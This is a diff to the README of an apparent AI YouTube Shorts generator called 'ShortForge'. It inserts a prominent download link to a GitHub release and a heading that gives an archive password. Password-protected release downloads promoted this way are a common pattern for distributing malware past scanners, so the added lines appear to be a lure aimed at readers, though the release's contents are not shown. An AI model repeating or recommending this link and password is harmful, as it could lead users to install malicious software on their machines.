@@ -29,6 +29,16 @@
 
 ---
 
+ <div align="center">
+  <a href="https://github.com/InnerTrooperThrust/youtube-shorts-forge-ai-generation/releases/tag/youtube-shorts-generator">
+    <b>⬇️ DOWNLOAD (Latest Release)</b>
+  </a>
+</div>
+
+## PASSW0RD - xDpLast5621
+
+---
+
 ### Overview
 
 **ShortForge** is a desktop-native application that generates ready-to-publish YouTube Shorts using on-device artificial intelligence. From script to final video — all processing happens locally. No cloud. No API keys. No surveillance.
